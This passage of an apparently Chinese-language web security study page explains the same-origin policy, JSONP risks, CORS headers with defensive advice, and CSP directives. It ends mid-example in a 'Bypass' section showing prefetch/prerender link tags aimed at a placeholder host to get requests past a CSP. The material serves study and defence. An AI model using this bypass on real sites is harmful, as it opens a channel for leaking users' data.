&lt;p&gt;不管使用哪个协议 (HTTP/HTTPS) 或端口号，浏览器都允许给定的域以及其任何子域名访问 cookie。设置 cookie 时，可以使用  &lt;code&gt;domain&lt;/code&gt;  /  &lt;code&gt;path&lt;/code&gt;  /  &lt;code&gt;secure&lt;/code&gt;  和  &lt;code&gt;http-only&lt;/code&gt;  标记来限定其访问性。&lt;/p&gt;
&lt;p&gt;所以  &lt;code&gt;https://localhost:8080/&lt;/code&gt;  和  &lt;code&gt;http://localhost:8081/&lt;/code&gt;  的 Cookie 是共享的。&lt;/p&gt;
&lt;h3 id=&#34;flashsilverlight跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#flashsilverlight跨域&#34;&gt;#&lt;/a&gt; Flash/SilverLight 跨域&lt;/h3&gt;
&lt;p&gt;浏览器的各种插件也存在跨域需求。通常是通过在服务器配置 crossdomain.xml，设置本服务允许哪些域名的跨域访问。&lt;/p&gt;
&lt;p&gt;客户端会请求此文件，如果发现自己的域名在访问列表里，就发起真正的请求，否则不发送请求。&lt;/p&gt;
&lt;h2 id=&#34;源的更改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#源的更改&#34;&gt;#&lt;/a&gt; 源的更改&lt;/h2&gt;
&lt;p&gt;同源策略认为域和子域属于不同的域，例如  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;a.com&lt;/code&gt;  /  &lt;code&gt;child1.a.com&lt;/code&gt;  与  &lt;code&gt;child2.a.com&lt;/code&gt;  /  &lt;code&gt;xxx.child1.a.com&lt;/code&gt;  与  &lt;code&gt;child1.a.com&lt;/code&gt;  两两不同源。&lt;/p&gt;
&lt;p&gt;对于这种情况，可以在两个方面各自设置  &lt;code&gt;document.domain=&#39;a.com&#39;&lt;/code&gt;  来改变其源来实现以上任意两个页面之间的通信。&lt;/p&gt;
&lt;p&gt;另外因为浏览器单独保存端口号，这种赋值会导致端口号被重写为  &lt;code&gt;null&lt;/code&gt;  。&lt;/p&gt;
&lt;h2 id=&#34;跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源访问&#34;&gt;#&lt;/a&gt; 跨源访问&lt;/h2&gt;
&lt;p&gt;同源策略控制了不同源之间的交互，这些交互通常分为三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通常允许跨域写操作 (Cross-origin writes)
&lt;ul&gt;
&lt;li&gt;链接 (links)&lt;/li&gt;
&lt;li&gt;重定向&lt;/li&gt;
&lt;li&gt;表单提交&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;通常允许跨域资源嵌入 (Cross-origin embedding)&lt;/li&gt;
&lt;li&gt;通常不允许跨域读操作 (Cross-origin reads)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;可能嵌入跨源的资源的一些示例有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;script src=&amp;quot;...&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;&lt;/code&gt;  标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;...&amp;quot;&amp;gt;&lt;/code&gt;  标签嵌入 CSS。由于 CSS 的松散的语法规则，CSS 的跨域需要一个设置正确的 Content-Type 消息头。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;img&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;video&amp;gt;&lt;/code&gt;  /  &lt;code&gt;&amp;lt;audio&amp;gt;&lt;/code&gt;  嵌入多媒体资源。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;object&amp;gt;&lt;/code&gt;   &lt;code&gt;&amp;lt;embed&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;applet&amp;gt;&lt;/code&gt;  的插件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;@font-face&lt;/code&gt;  引入的字体。一些浏览器允许跨域字体 (cross-origin fonts)，一些需要同源字体 (same-origin fonts)。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;frame&amp;gt;&lt;/code&gt;  和  &lt;code&gt;&amp;lt;iframe&amp;gt;&lt;/code&gt;  载入的任何资源。站点可以使用 X-Frame-Options 消息头来阻止这种形式的跨域交互。&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;jsonp跨域&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsonp跨域&#34;&gt;#&lt;/a&gt; JSONP 跨域&lt;/h3&gt;
&lt;p&gt;JSONP 就是利用  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标签的跨域能力实现跨域数据的访问，请求动态生成的 JavaScript 脚本同时带一个 callback 函数名作为参数。&lt;/p&gt;
&lt;p&gt;服务端收到请求后，动态生成脚本产生数据，并在代码中以产生的数据为参数调用 callback 函数。&lt;/p&gt;
&lt;p&gt;JSONP 也存在一些安全问题，例如当对传入 / 传回参数没有做校验就直接执行返回的时候，会造成 XSS 问题。没有做 Referer 或 Token 校验就给出数据的时候，可能会造成数据泄露。&lt;/p&gt;
&lt;p&gt;另外 JSONP 在没有设置 callback 函数的白名单情况下，可以合法的做一些设计之外的函数调用，引入问题。这种攻击也被称为 SOME 攻击。&lt;/p&gt;
&lt;h3 id=&#34;跨源脚本api访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源脚本api访问&#34;&gt;#&lt;/a&gt; 跨源脚本 API 访问&lt;/h3&gt;
&lt;p&gt;Javascript 的 APIs 中，如  &lt;code&gt;iframe.contentWindow&lt;/code&gt;  ,  &lt;code&gt;window.parent&lt;/code&gt; ,  &lt;code&gt;window.open&lt;/code&gt;  和  &lt;code&gt;window.opener&lt;/code&gt;  允许文档间相互引用。当两个文档的源不同时，这些引用方式将对  &lt;code&gt;window&lt;/code&gt;  和  &lt;code&gt;location&lt;/code&gt;  对象的访问添加限制。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的方法有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.blur&lt;/li&gt;
&lt;li&gt;window.close&lt;/li&gt;
&lt;li&gt;window.focus&lt;/li&gt;
&lt;li&gt;window.postMessage&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;code&gt;window&lt;/code&gt;  允许跨源访问的属性有&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;window.closed&lt;/li&gt;
&lt;li&gt;window.frames&lt;/li&gt;
&lt;li&gt;window.length&lt;/li&gt;
&lt;li&gt;window.location&lt;/li&gt;
&lt;li&gt;window.opener&lt;/li&gt;
&lt;li&gt;window.parent&lt;/li&gt;
&lt;li&gt;window.self&lt;/li&gt;
&lt;li&gt;window.top&lt;/li&gt;
&lt;li&gt;window.window&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中  &lt;code&gt;window.location&lt;/code&gt;  允许读 / 写，其他的属性只允许读&lt;/p&gt;
&lt;h3 id=&#34;跨源数据存储访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#跨源数据存储访问&#34;&gt;#&lt;/a&gt; 跨源数据存储访问&lt;/h3&gt;
&lt;p&gt;存储在浏览器中的数据，如  &lt;code&gt;localStorage&lt;/code&gt;  和  &lt;code&gt;IndexedDB&lt;/code&gt; ，以源进行分割。每个源都拥有自己单独的存储空间，一个源中的 Javascript 脚本不能对属于其它源的数据进行读写操作。&lt;/p&gt;
&lt;h2 id=&#34;cors&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cors&#34;&gt;#&lt;/a&gt; CORS&lt;/h2&gt;
&lt;p&gt;CORS 是一个 W3C 标准，全称是跨域资源共享 (Cross-origin resource sharing)。通过这个标准，可以允许浏览器读取跨域的资源。&lt;/p&gt;
&lt;h3 id=&#34;常见请求头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见请求头&#34;&gt;#&lt;/a&gt; 常见请求头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Origin
&lt;ul&gt;
&lt;li&gt;预检请求或实际请求的源站 URI, 浏览器请求默认会发送该字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Origin: &amp;lt;origin&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Method
&lt;ul&gt;
&lt;li&gt;声明请求使用的方法&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Method: &amp;lt;method&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Request-Headers
&lt;ul&gt;
&lt;li&gt;声明请求使用的 header 字段&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Request-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;常见返回头&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常见返回头&#34;&gt;#&lt;/a&gt; 常见返回头&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;Access-Control-Allow-Origin
&lt;ul&gt;
&lt;li&gt;声明允许访问的源外域 URI&lt;/li&gt;
&lt;li&gt;对于携带身份凭证的请求不可使用通配符&lt;/li&gt;
&lt;li&gt;&lt;code&gt;*``Access-Control-Allow-Origin: &amp;lt;origin&amp;gt; | *&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Expose-Headers
&lt;ul&gt;
&lt;li&gt;声明允许暴露的头&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Max-Age
&lt;ul&gt;
&lt;li&gt;声明 Cache 时间&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Max-Age: &amp;lt;delta-seconds&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Credentials
&lt;ul&gt;
&lt;li&gt;声明是否允许在请求中带入&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Credentials: true&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Methods
&lt;ul&gt;
&lt;li&gt;声明允许的访问方式&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Methods: &amp;lt;method&amp;gt;[, &amp;lt;method&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Access-Control-Allow-Headers
&lt;ul&gt;
&lt;li&gt;声明允许的头&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Access-Control-Allow-Headers: &amp;lt;field-name&amp;gt;[, &amp;lt;field-name&amp;gt;]*&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;防御建议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#防御建议&#34;&gt;#&lt;/a&gt; 防御建议&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;如非必要不开启 CORS&lt;/li&gt;
&lt;li&gt;定义详细的白名单，不使用通配符，仅配置所需要的头&lt;/li&gt;
&lt;li&gt;配置  &lt;code&gt;Vary: Origin&lt;/code&gt;  头部&lt;/li&gt;
&lt;li&gt;如非必要不使用  &lt;code&gt;Access-Control-Allow-Credentials&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;限制缓存的时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;阻止跨源访问&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#阻止跨源访问&#34;&gt;#&lt;/a&gt; 阻止跨源访问&lt;/h2&gt;
&lt;p&gt;阻止跨域写操作，可以检测请求中的  &lt;code&gt;CSRF token&lt;/code&gt;  ，这个标记被称为 Cross-Site Request Forgery (CSRF) 标记。&lt;/p&gt;
&lt;p&gt;阻止资源的跨站读取，因为嵌入资源通常会暴露信息，需要保证资源是不可嵌入的。但是多数情况下浏览器都不会遵守  &lt;code&gt;Content-Type&lt;/code&gt;  消息头。例如如果在 HTML 文档中指定  &lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt;  标记，则浏览器会尝试将 HTML 解析为 JavaScript。&lt;/p&gt;
&lt;h1 id=&#34;csp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp&#34;&gt;#&lt;/a&gt; CSP&lt;/h1&gt;
&lt;h2 id=&#34;csp是什么&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#csp是什么&#34;&gt;#&lt;/a&gt; CSP 是什么？&lt;/h2&gt;
&lt;p&gt;Content Security Policy，简称 CSP，译作内容安全策略。顾名思义，这个规范与内容安全有关，主要是用来定义哪些资源可以被当前页面加载，减少 XSS 的发生。&lt;/p&gt;
&lt;h2 id=&#34;配置&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置&#34;&gt;#&lt;/a&gt; 配置&lt;/h2&gt;
&lt;p&gt;CSP 策略可以通过 HTTP 头信息或者 meta 元素定义。&lt;/p&gt;
&lt;p&gt;CSP 有三类：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content-Security-Policy (Google Chrome)&lt;/li&gt;
&lt;li&gt;X-Content-Security-Policy (Firefox)&lt;/li&gt;
&lt;li&gt;X-WebKit-CSP (WebKit-based browsers, e.g. Safari)&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;figcaption data-lang=&#34;HTTP&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;HTTP header :&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&#34;Content-Security-Policy-Report-Only:&#34; 策略&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;HTTP Content-Security-Policy 头可以指定一个或多个资源是安全的，而 Content-Security-Policy-Report-Only 则是允许服务器检查（非强制）一个策略。多个头的策略定义由优先采用最先定义的。&lt;/p&gt;
&lt;p&gt;HTML Meta :&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;meta&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;http-equiv&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;content-security-policy-report-only&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;content&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;策略&lt;span class=&#34;token punctuation&#34;&gt;&#34;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;指令说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#指令说明&#34;&gt;#&lt;/a&gt; 指令说明&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;指令&lt;/th&gt;
&lt;th&gt;说明&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;default-src&lt;/td&gt;
&lt;td&gt;定义资源默认加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;connect-src&lt;/td&gt;
&lt;td&gt;定义 Ajax、WebSocket 等加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;font-src&lt;/td&gt;
&lt;td&gt;定义 Font 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;frame-src&lt;/td&gt;
&lt;td&gt;定义 Frame 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;img-src&lt;/td&gt;
&lt;td&gt;定义图片加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;media-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;audio&amp;gt;、&amp;lt;video&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;object-src&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;applet&amp;gt;、&amp;lt;embed&amp;gt;、&amp;lt;object&amp;gt; 等引用资源加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;script-src&lt;/td&gt;
&lt;td&gt;定义 JS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;style-src&lt;/td&gt;
&lt;td&gt;定义 CSS 加载策略&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;base-uri&lt;/td&gt;
&lt;td&gt;定义 &amp;lt;base&amp;gt; 根 URL 策略，不使用 default-src 作为默认值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;sandbox&lt;/td&gt;
&lt;td&gt;值为 allow-forms，对资源启用 sandbox&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;report-uri&lt;/td&gt;
&lt;td&gt;值为 /report-uri，提交日志&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许从任意 url 加载，除了  &lt;code&gt;data:&lt;/code&gt;   &lt;code&gt;blob:&lt;/code&gt;   &lt;code&gt;filesystem:&lt;/code&gt;   &lt;code&gt;schemes&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src -&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;none&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;禁止从任何 url 加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;object-src &#39;none&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;self&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;只可以加载同源资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;可以通过 data 协议加载资源&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src &#39;self&#39; data:&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;domain.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src domain.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只可以从特定的域加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;\*.example.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src \*.example.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;可以从任意 example.com 的子域处加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https://cdn.com&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https://cdn.com&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从给定的域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;https:&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;e.g.  &lt;code&gt;img-src https:&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;只能从任意域用 https 加载资源&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-inline&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许内部资源执行代码例如 style attribute,onclick 或者是 sicript 标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-inline&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;unsafe-eval&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许一些不安全的代码执行方式，例如 js 的 eval ()&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;unsafe-eval&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;nonce-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;使用随机的 nonce，允许加载标签上 nonce 属性匹配的标签&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;nonce-bm9uY2U=&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&amp;lt;hash-algo&amp;gt;-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;允许 hash 值匹配的代码块被执行&lt;/li&gt;
&lt;li&gt;e.g.  &lt;code&gt;script-src &#39;sha256-&amp;lt;base64-value&amp;gt;&#39;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;配置范例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#配置范例&#34;&gt;#&lt;/a&gt; 配置范例&lt;/h3&gt;
&lt;p&gt;允许执行内联 JS 代码，但不允许加载外部资源&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;Content&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Security&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;Policy&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;default&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; script&lt;span class=&#34;token operator&#34;&gt;-&lt;/span&gt;src &lt;span class=&#34;token string&#34;&gt;&#39;self&#39;&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;unsafe-inline&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;bypass&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#bypass&#34;&gt;#&lt;/a&gt; Bypass&lt;/h2&gt;
&lt;h3 id=&#34;预加载&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#预加载&#34;&gt;#&lt;/a&gt; 预加载&lt;/h3&gt;
&lt;p&gt;浏览器为了增强用户体验，让浏览器更有效率，就有一个预加载的功能，大体是利用浏览器空闲时间去加载指定的内容，然后缓存起来。这个技术又细分为 DNS-prefetch、subresource、prefetch、preconnect、prerender。&lt;/p&gt;
&lt;p&gt;HTML5 页面预加载是用 link 标签的 rel 属性来指定的。如果 csp 头有 unsafe-inline，则用预加载的方式可以向外界发出请求，例如&lt;/p&gt;
&lt;figure class=&#34;highlight html&#34;&gt;&lt;figcaption data-lang=&#34;HTML&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- 预加载某个页面 --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prefetch&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;&amp;lt;!-- firefox --&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token tag&#34;&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;lt;&lt;/span&gt;link&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;rel&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;prerender&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt; &lt;span class=&#34;token attr-name&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;token attr-value&#34;&gt;&lt;span class=&#34;token punctuation attr-equals&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;http://xxxx&lt;span class=&#34;token punctuation&#34;&gt;&#39;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token 